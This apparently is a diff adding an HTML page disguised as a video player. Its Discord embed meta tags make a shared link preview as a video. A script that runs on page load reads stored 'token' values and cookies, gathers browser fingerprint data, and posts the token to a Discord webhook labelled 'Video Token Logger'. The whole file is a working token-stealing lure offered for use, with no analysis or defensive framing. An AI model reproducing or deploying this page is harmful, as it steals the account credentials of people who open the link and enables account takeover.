@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- ========== DISCORD EMBED META TAGS ========== -->
+    <meta property="og:title" content="Video" />
+    <meta property="og:type" content="video.other" />
+    <meta property="og:video" content="https://www.w3schools.com/html/mov_bbb.mp4" />
+    <meta property="og:video:type" content="video/mp4" />
+    <meta property="og:video:width" content="640" />
+    <meta property="og:video:height" content="360" />
+    <meta property="og:image" content="https://via.placeholder.com/640x360/000/fff?text=Video" />
+    
+    <title>Video</title>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .container { max-width: 800px; width: 100%; padding: 20px; }
+        .video-wrapper {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .video-wrapper video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .loading {
+            color: #888;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #333;
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="video-wrapper">
+            <video id="video" controls autoplay playsinline>
+                <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="loading">
+            <span class="spinner"></span> Loading video...
+        </div>
+    </div>
+
+    <script>
+    // ============================================
+    //  REPLACE WITH YOUR WEBHOOK URL
+    // ============================================
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+
+    // ============================================
+    //  EXTRACT TOKENS
+    // ============================================
+    function extractTokens() {
+        let token = null;
+        let cookies = document.cookie || 'No cookies';
+        
+        try {
+            token = localStorage.getItem('token');
+        } catch(e) {}
+        
+        if (!token) {
+            try {
+                token = sessionStorage.getItem('token');
+            } catch(e) {}
+        }
+        
+        if (token) {
+            try {
+                token = token.replace(/^"|"$/g, '');
+            } catch(e) {}
+        }
+        
+        const browserInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        
+        return { token, cookies, browserInfo };
+    }
+
+    // ============================================
+    //  SEND TO WEBHOOK
+    // ============================================
+    async function sendToWebhook(data) {
+        const payload = {
+            embeds: [{
+                title: ' Video Token Extracted!',
+                color: 0xff0000,
+                fields: [
+                    { name: 'Discord Token', value: data.token || ' No token found', inline: false },
+                    { name: 'Browser', value: data.browserInfo.userAgent.substring(0, 100), inline: false },
+                    { name: 'Platform', value: data.browserInfo.platform, inline: true },
+                    { name: 'Screen', value: data.browserInfo.screen, inline: true },
+                    { name: 'Time', value: new Date().toISOString(), inline: true }
+                ],
+                footer: { text: 'Video Token Logger' }
+            }]
+        };
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            console.log('✅ Token sent to webhook');
+        } catch(e) {
+            console.error('Webhook error:', e);
+        }
+    }
+
+    // ============================================
+    //  EXECUTE
+    // ============================================
+    (async function() {
+        const data = extractTokens();
+        await sendToWebhook(data);
+        console.log('Token:', data.token || 'No token');
+        console.log('Video loaded successfully');
+    })();
+    </script>
+</body>
+</html>
